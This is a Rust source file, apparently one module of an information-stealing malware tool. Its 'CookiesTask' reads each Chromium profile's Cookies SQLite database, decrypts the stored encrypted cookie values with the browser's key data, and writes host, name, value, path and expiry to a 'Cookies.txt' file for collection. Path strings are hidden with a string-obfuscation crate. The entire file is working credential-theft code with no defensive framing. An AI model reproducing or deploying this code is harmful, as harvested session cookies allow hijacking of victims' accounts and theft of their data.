use crate::alloc::borrow::ToOwned;
use crate::chromium::{BrowserData, decrypt_data};
use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const COOKIES_HOST_KEY: usize = 1;
const COOKIES_NAME: usize = 3;
const COOKIES_ENCRYPTED_VALUE: usize = 5;
const COOKIES_PATH: usize = 6;
const COOKIES_EXPIRES_UTC: usize = 7;

pub(super) struct CookiesTask {
    browser: Arc<BrowserData>,
}

impl CookiesTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
    parent_name!("Cookies.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(cookies) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("Network") / s!("Cookies"),
            s!("Cookies"),
            |record| extract_cookie_from_record(record, &self.browser),
        ) else {
            return;
        };

        collector.get_browser().increase_cookies_by(cookies.len());
        let _ = to_string_and_write_all(&cookies, "\n", filesystem, parent);
    }
}

fn extract_cookie_from_record<R: TableRecord>(
    record: &R,
    browser_data: &BrowserData,
) -> Option<Cookie> {
    let host_key = record.get_value(COOKIES_HOST_KEY)?.as_string()?;
    let name = record.get_value(COOKIES_NAME)?.as_string()?;
    let path = record.get_value(COOKIES_PATH)?.as_string()?;
    let expires_utc = record.get_value(COOKIES_EXPIRES_UTC)?.as_integer()?;

    let encrypted_value = record.get_value(COOKIES_ENCRYPTED_VALUE)?.as_blob()?;
    let value = decrypt_data(&encrypted_value, browser_data)?.into();

    Some(Cookie {
        host_key,
        name,
        value,
        path,
        expires_utc,
    })
}
